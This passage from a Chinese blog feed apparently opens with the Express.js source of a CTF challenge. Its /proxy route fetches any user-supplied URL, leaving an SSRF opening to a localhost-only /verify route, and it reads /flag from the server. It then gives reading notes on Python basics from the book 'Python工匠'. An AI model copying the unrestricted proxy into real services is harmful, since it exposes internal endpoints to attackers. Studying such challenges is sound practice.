class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// 从文件中加载 flag</span><br><span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br><br><span class="hljs-comment">// Session 管理</span><br><span class="hljs-keyword">let</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>);<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">FileStore</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;session-file-store&#x27;</span>)(session);<br><span class="hljs-keyword">let</span> identityKey = <span class="hljs-string">&#x27;session&#x27;</span>;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">name</span>: identityKey,<br>  <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">store</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileStore</span>(),<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">cookie</span>: &#123;<br>    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">600</span><br>  &#125;<br>&#125;));<br><br><span class="hljs-comment">// 中间件</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">logger</span>(<span class="hljs-string">&#x27;dev&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span>&#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><span class="hljs-comment">// 中间件用于设置默认会话值</span><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> === <span class="hljs-literal">undefined</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = <span class="hljs-string">&quot;guest&quot;</span>;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br><span class="hljs-comment">// 路由处理程序</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Node Proxy&#x27;</span>, <span class="hljs-attr">username</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>&#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/test&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;test test&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/app.js&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span> !== <span class="hljs-literal">undefined</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> = <span class="hljs-literal">false</span>;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;You have registered successfully!&#x27;</span>&#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;No username provided!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/verify&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">checkIP</span>(req) !== <span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;You are not from LOCAL!&#x27;</span>&#125;);<br>  &#125;<br><br>  <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">body</span>.<span class="hljs-property">token</span>;<br>  <span class="hljs-keyword">if</span> (token === <span class="hljs-string">&#x27;you_will_never_know&#x27;</span> &amp;&amp; req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> = <span class="hljs-literal">true</span>;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;VERIFIED SUCCESS!&#x27;</span>&#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;NO!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">is_verified</span> !== <span class="hljs-literal">true</span>) &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;NO! Your are not verified!&#x27;</span>&#125;);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: flag&#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;NO! Your are not admin!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/proxy&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">let</span> url = req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span> ? req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (url) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      http.<span class="hljs-title function_">get</span>(url, <span class="hljs-function">(<span class="hljs-params">r</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> &#123;statusCode&#125; = r;<br>        <span class="hljs-keyword">if</span> (r &amp;&amp; statusCode === <span class="hljs-number">200</span>) &#123;<br>          r.<span class="hljs-title function_">setEncoding</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>          <span class="hljs-keyword">let</span> data = <span class="hljs-string">&#x27;&#x27;</span>;<br>          r.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> &#123;<br>            data += chunk;<br>          &#125;);<br>          r.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>            res.<span class="hljs-title function_">send</span>(data);<br>          &#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;error&#x27;</span>&#125;);<br>        &#125;<br>      &#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (e.<span class="hljs-property">code</span> === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>          res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: e.<span class="hljs-property">message</span>&#125;);<br>        &#125;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;error&#x27;</span>&#125;);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Missing url param!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 错误处理</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">message</span> = err.<span class="hljs-property">message</span>;<br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">error</span> = req.<span class="hljs-property">app</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;env&#x27;</span>) === <span class="hljs-string">&#x27;development&#x27;</span> ? err : &#123;&#125;;<br>  res.<span class="hljs-title function_">status</span>(err.<span class="hljs-property">status</span> || <span class="hljs-number">500</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">// 辅助函数，检查 IP 是否为本地主机</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkIP</span>(<span class="hljs-params">req</span>) &#123;<br>  <span class="hljs-keyword">let</span> ip = req.<span class="hljs-property">connection</span>.<span class="hljs-property">remoteAddress</span>;<br>  <span class="hljs-keyword">if</span> (ip.<span class="hljs-title function_">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>) === <span class="hljs-string">&quot;::ffff:&quot;</span>) &#123;<br>    ip = ip.<span class="hljs-title function_">substr</span>(<span class="hljs-number">7</span>)<br>  &#125;<br>  <span class="hljs-keyword">return</span> ip === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Python工匠》读书笔记</title>
    <link href="/2024/04/20/%E3%80%8APython%E5%B7%A5%E5%8C%A0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/20/%E3%80%8APython%E5%B7%A5%E5%8C%A0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>唉，学</p><span id="more"></span><h2 id="变量与注释"><a href="#变量与注释" class="headerlink" title="变量与注释"></a>变量与注释</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>比较以下两行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 去掉 s 两边的空格，再处理</span><br>value = process(s.strip())<br><span class="hljs-comment"># 用户输入可能会有空格，使用 strip() 去掉空格</span><br>username = extract_username(input_string.strip())<br></code></pre></td></tr></table></figure><p>好的变量和注释并非为计算机而写，而是为每个阅读代码 的人而写（当然也包括你自己）。变量与注释是作者表达思想的基础，是 读者理解代码的第一道门，它们对代码质量的贡献毋庸置疑。</p><h4 id="1-1-1-变量常见用法"><a href="#1-1-1-变量常见用法" class="headerlink" title="1.1.1 变量常见用法"></a>1.1.1 变量常见用法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>author = <span class="hljs-string">&#x27;piglei&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#123;&#125;!&#x27;</span>.<span class="hljs-built_in">format</span>(author))<br>Hello, piglei!<br></code></pre></td></tr></table></figure><p><code>java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;piglei&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;Hello, %s!&quot;</span>, author);<br>System.out.println(message);<br></code></pre></td></tr></table></figure><p>Python 是一门动态类型的语言，所以我们无须预先声明变量类 型，直接对变量赋值即可。</p><p>也可以在一行语句里同时操作多个变量，比如调换两个变量所指向的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-meta">&gt;&gt;&gt; </span>author, reader = <span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-string">&#x27;raymond&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>author, reader = reader, author<br><span class="hljs-meta">&gt;&gt;&gt; </span>author<br><span class="hljs-string">&#x27;raymond&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="变量解包"><a href="#变量解包" class="headerlink" title="变量解包"></a>变量解包</h5><p>变量解包允许我们 把一个可迭代对象（比如列表）的所有成员，一次性赋值给多个变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-meta">&gt;&gt;&gt; </span>usernames = [<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-string">&#x27;raymond&#x27;</span>]<br><span class="hljs-comment"># 注意：左侧变量的个数必须和待展开的列表长度相等，否则会报错</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>author, reader = usernames<br><span class="hljs-meta">&gt;&gt;&gt; </span>author<br><span class="hljs-string">&#x27;piglei&#x27;</span><br><span class="hljs-comment">#或者：</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>attrs = [<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-number">100</span>]]<br><span class="hljs-meta">&gt;&gt;&gt; </span>user_id, (username, score) = attrs<br><span class="hljs-meta">&gt;&gt;&gt; </span>user_id<br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username<br><span class="hljs-string">&#x27;piglei&#x27;</span><br></code></pre></td></tr></table></figure><p>只要用星号表达式（*variables）作为变量名，它便会贪婪地捕获多个值对象，并将捕获到的内容作为列表赋值给variables。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>data = [<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-number">100</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>username, *fruits, score = data<br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username<br><span class="hljs-string">&#x27;piglei&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>fruits<br>[<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>score<br><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>和常规的切片赋值语句比起来，动态解包语法要直观许多：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. 动态解包</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username, *fruits, score = data<br><span class="hljs-comment"># 2. 切片赋值</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username, fruits, score = data[<span class="hljs-number">0</span>], data[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>], data[-<span class="hljs-number">1</span>]<br><span class="hljs-comment"># 两种变量赋值方式完全等价</span><br></code></pre></td></tr></table></figure><p>当然也可以在循环语句中使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> username, score <span class="hljs-keyword">in</span> [[<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-number">100</span>], [<span class="hljs-string">&#x27;raymond&#x27;</span>, <span class="hljs-number">60</span>]]:<br><span class="hljs-meta">... </span> <span class="hljs-built_in">print</span>(username)<br>...<br>piglei<br>raymond<br></code></pre></td></tr></table></figure><h5 id="单下划线变量名"><a href="#单下划线变量名" class="headerlink" title="单下划线变量名 _"></a>单下划线变量名 _</h5><p>假如你想在解包赋值时忽略某些变量，就可以使用 _ 作为 变量名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 忽略展开时的第二个变量</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>author, _ = usernames<br><span class="hljs-comment"># 忽略第一个和最后一个变量之间的所有变量</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username, *_, score = data<br></code></pre></td></tr></table></figure><h4 id="1-1-2-给变量注明类型"><a href="#1-1-2-给变量注明类型" class="headerlink" title="1.1.2 给变量注明类型"></a>1.1.2 给变量注明类型</h4><p>Python 是动态类型语言，使用变量时不需要做任何类型声明。但任何事物都有其两面性。动态类型所带来的缺点是代码的可读性会因此大打折扣。</p><blockquote><p>在 Python 中，函数文档通常称为文档字符串（docstring）。文档字符串是在函数定义中的字符串文字，用于描述函数的目的、用法、参数和返回值等信息。文档字符串通常位于函数定义的第一行下方，用三重引号（单引号或双引号都可以）括起来。</p></blockquote><p>类似这种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_invalid</span>(<span class="hljs-params">items</span>):<br> <span class="hljs-string">&quot;&quot;&quot;剔除 items 里面无效的元素</span><br><span class="hljs-string"> :param items: 待剔除对象</span><br><span class="hljs-string"> :type items: 包含整数的列表，[int, ...]</span><br><span class="hljs-string"> &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>　在上面的函数文档里，我用 :type items: 注明了 items 是个整型列表。任何人只要读到这份文档，马上就能知道参数类型。</p><p>当然现在还有类型注解的方式，更加清晰简易：</p><p>​要使用类型注解，只需在变量后添加类型，并用冒号隔开即可，比如 func(value: str) 表示函数的 value 参数为字符串类型。下面是给 remove_invalid() 函数添加类型注解后的样子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_invalid</span>(<span class="hljs-params">items: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>): <br> <span class="hljs-string">&quot;&quot;&quot;剔除 items 里面无效的元素&quot;&quot;&quot;</span><br> ... ...<br><span class="hljs-comment">#List 表示参数为列表类型，[int] 表示里面的成员是整型</span><br></code></pre></td></tr></table></figure><h4 id="1-1-3-变量命名原则"><a href="#1-1-3-变量命名原则" class="headerlink" title="1.1.3 变量命名原则"></a>1.1.3 变量命名原则</h4><p>对于普通变量，使用蛇形命名法，比如 max_value； 对于常量，采用全大写字母，使用下划线连接，比如 MAX_VALUE； 如果变量标记为“仅内部使用”，为其增加下划线前缀，比如 <code>_local_var</code>； 当名字与 Python 关键字冲突时，在变量末尾追加下划线，比如 <code>class_</code>。 除变量名以外，PEP 8 中还有许多其他命名规范，比如类名应该使用 驼峰风格（FooClass）、函数应该使用蛇形风格 （bar_function），等等。</p><h2 id="数值与字符串"><a href="#数值与字符串" class="headerlink" title="数值与字符串"></a>数值与字符串</h2><p>在 Python 里使用整型，你不需要了解“有符号” “无符号”“32 位”“64 位”这些令人头疼的概念。不论多大的数字都能直接用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 无符号 64 位整型的最大值（unsigned int64）</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span><br><span class="hljs-number">18446744073709551615</span><br><span class="hljs-comment"># 直接乘上 10000 也没问题，永不溢出！</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">18446744073709551615</span> * <span class="hljs-number">10000</span><br><span class="hljs-number">184467440737095516150000</span><br></code></pre></td></tr></table></figure><p>和数字一样，Python 里的字符串（string）也很容易上手 。它直接兼容所有的 Unicode 字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">&#x27;Hello, 中文&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(s)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-comment"># 打印中文</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(s)<br>Hello, 中文<br></code></pre></td></tr></table></figure><h4 id="2-1-1-数值基础"><a href="#2-1-1-数值基础" class="headerlink" title="2.1.1 数值基础"></a>2.1.1 数值基础</h4><p>在 Python 中，一共存在三种内置数值类型：整型（int）、浮点型 （float）和复数类型（complex）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义一个整型</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>score = <span class="hljs-number">100</span><br><span class="hljs-comment"># 定义一个浮点型</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>temp = <span class="hljs-number">37.2</span><br><span class="hljs-comment"># 定义一个复数</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>com = <span class="hljs-number">1</span>+<span class="hljs-number">2j</span><br></code></pre></td></tr></table></figure><p>int 与 float之间可以通过各自的内置方法进行转换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将浮点数转换为整型</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">int</span>(temp)<br><span class="hljs-number">37</span><br><span class="hljs-comment"># 将整型转换为浮点型</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">float</span>(score)<br><span class="hljs-number">100.0</span><br></code></pre></td></tr></table></figure><p>如果数字特别长，可以插入 _ 分隔符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 以&quot;千&quot;为单位分隔数字</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>i = <span class="hljs-number">1_000_000</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>i + <span class="hljs-number">10</span><br><span class="hljs-number">1000010</span><br></code></pre></td></tr></table></figure><p>浮点数精度问题:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0.1</span> + <span class="hljs-number">0.2</span><br><span class="hljs-number">0.30000000000000004</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最近做的几道java题</title>
    <link href="/2024/04/20/%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E5%87%A0%E9%81%93java%E9%A2%98/"/>
    <url>/2024/04/20/%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E5%87%A0%E9%81%93java%E9%A2%98/</url>
    
